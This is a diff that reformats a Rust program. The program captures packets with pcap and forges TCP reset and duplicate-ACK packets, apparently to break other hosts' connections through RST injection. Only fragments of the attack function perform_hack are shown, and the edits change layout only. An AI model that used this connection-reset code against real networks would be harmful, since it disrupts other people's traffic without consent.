@@ -4,8 +4,8 @@ use crate::os::OsInfo;
 use etherparse::{EtherType, Ethernet2Header, IpNumber, Ipv4Header, PacketBuilder, TcpHeader};
 use pcap::{Active, Capture, Device};
 use std::hash::BuildHasher;
-use std::thread::{self, Builder};
 use std::thread::sleep;
+use std::thread::{self, Builder};
 use std::time::Duration;
 
 enum AttackType {
@@ -38,7 +38,7 @@ fn main() {
 
     // start sending packets in a separate thread
 
-    /* 
+    /*
     thread::spawn(move || {
         test_sending_packets(interface.as_str());
     });
@@ -60,7 +60,7 @@ fn main() {
                             tcp_header,
                             payload,
                             attack_type,
-                            &mut send_cap
+                            &mut send_cap,
                         );
                     }
                     Err(_) => {
@@ -124,7 +124,7 @@ fn perform_hack(
     tcp_header: TcpHeader,
     payload: &[u8],
     attack_type: &AttackType,
-    send_cap: &mut Capture<Active>
+    send_cap: &mut Capture<Active>,
 ) {
     //let interface = OsInfo::get_interface();
     //let mut cap = get_capture(interface.as_str());
@@ -132,22 +132,23 @@ fn perform_hack(
     //payload doesn't matter for the hacks, since we are just resetting the connection
     let payload = &[];
 
-    // Builder 
+    // Builder
     let builder = PacketBuilder::ethernet2(ethernet_header.destination, ethernet_header.source)
-                                                .ipv4(ipv4_header.destination, 
-                                                    ipv4_header.source, 
-                                                    ipv4_header.time_to_live
-                                                )
-                                                .tcp(tcp_header.destination_port, 
-                                                    tcp_header.source_port, 
-                                                    tcp_header.acknowledgment_number, // used to be "tcp_header.sequence_number"
-                                                    tcp_header.window_size
-                                                );
+        .ipv4(
+            ipv4_header.destination,
+            ipv4_header.source,
+            ipv4_header.time_to_live,
+        )
+        .tcp(
+            tcp_header.destination_port,
+            tcp_header.source_port,
+            tcp_header.acknowledgment_number, // used to be "tcp_header.sequence_number"
+            tcp_header.window_size,
+        );
 
     match attack_type {
         //RST injection to reset the connection
         AttackType::RSTInjection => {
-
             let builder = builder.rst();
 
             let mut packet = Vec::<u8>::with_capacity(builder.size(payload.len()));
@@ -160,7 +161,7 @@ fn perform_hack(
         }
         AttackType::DuplicateAck => {
             let ack_number = tcp_header.sequence_number;
-            
+
             let builder = builder.ack(ack_number);
 
             let mut packet = Vec::<u8>::with_capacity(builder.size(payload.len()));
